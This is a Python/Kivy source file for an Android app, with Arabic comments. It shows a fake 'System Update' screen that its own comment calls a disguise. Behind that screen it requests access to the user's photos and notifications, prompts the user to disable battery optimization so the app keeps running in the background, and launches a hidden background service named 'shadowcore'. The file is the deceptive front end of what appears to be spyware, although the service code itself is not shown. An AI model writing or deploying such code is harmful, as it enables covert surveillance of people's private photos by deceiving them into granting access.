import threading
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass

# استدعاء أدوات النظام لبيئة أندرويد
PythonActivity = autoclass('org.kivy.android.PythonActivity')
Intent = autoclass('android.content.Intent')
Settings = autoclass('android.provider.Settings')
Uri = autoclass('android.net.Uri')

class ShadowSystemApp(App):
    def build(self):
        # واجهة تمويهية للمستخدم (تحديث النظام)
        return Label(
            text="[b]System Update[/b]\n[color=00ff00]Checking for system updates...[/color]\nPlease do not close the app.", 
            markup=True,
            halign="center"
        )

    def on_start(self):
        # تشغيل العمليات بالتسلسل (نظام الجدولة لتفادي الانهيار)
        
        # 1. طلب الأذونات (صور وإشعارات) بعد ثانية واحدة
        Clock.schedule_once(self.ask_permissions, 1)
        
        # 2. طلب استثناء البطارية بعد 4 ثوانٍ (لضمان البقاء في الخلفية)
        Clock.schedule_once(self.request_battery_bypass, 4)
        
        # 3. إطلاق الخدمة الخلفية (service.py) بعد 6 ثوانٍ
        Clock.schedule_once(self.launch_service, 6)

    def ask_permissions(self, dt):
        try:
            from android.permissions import request_permissions, Permission
            # أذونات أندرويد 13 و 14 الأساسية
            perms = [Permission.READ_MEDIA_IMAGES, Permission.POST_NOTIFICATIONS]
            request_permissions(perms)
        except Exception as e:
            print(f"Permissions Error: {e}")

    def request_battery_bypass(self, dt):
        try:
            # توجيه المستخدم لتعطيل تحسين البطارية للتطبيق
            activity = PythonActivity.mActivity
            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.setData(Uri.parse(f"package:{activity.getPackageName()}"))
            activity.startActivity(intent)
        except:
            pass

    def launch_service(self, dt):
        try:
            # تشغيل كلاس الخدمة المسمى في buildozer.spec
            context = PythonActivity.mActivity
            # تأكد أن المسار يطابق Package Name و Service Name تماماً
            service_class = autoclass('org.test.shadowcore.ServiceMyservice')
            service_class.start(context, "")
            print("System Service Started Successfully!")
        except Exception as e:
            print(f"Critical Service Error: {e}")

if __name__ == "__main__":
    ShadowSystemApp().run()
